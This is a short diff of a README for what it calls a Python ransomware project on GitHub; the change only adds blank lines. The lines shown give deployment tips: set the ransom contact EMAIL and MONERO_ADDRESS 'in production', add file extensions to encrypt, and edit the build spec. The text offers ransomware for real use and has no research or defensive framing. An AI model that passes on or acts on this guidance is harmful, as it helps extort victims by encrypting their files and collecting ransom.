@@ -68,5 +68,7 @@ Probably the best Python ransomware available on Github
 
 
 [-] In production dont forget to edit the EMAIL and MONERO_ADDRESS in const.py.
+
 [-] Add some files extensions on encryption/encrypt.py line 26.
+
 [-] You can modify the build.spec if you want change the behaviour of the ransomware
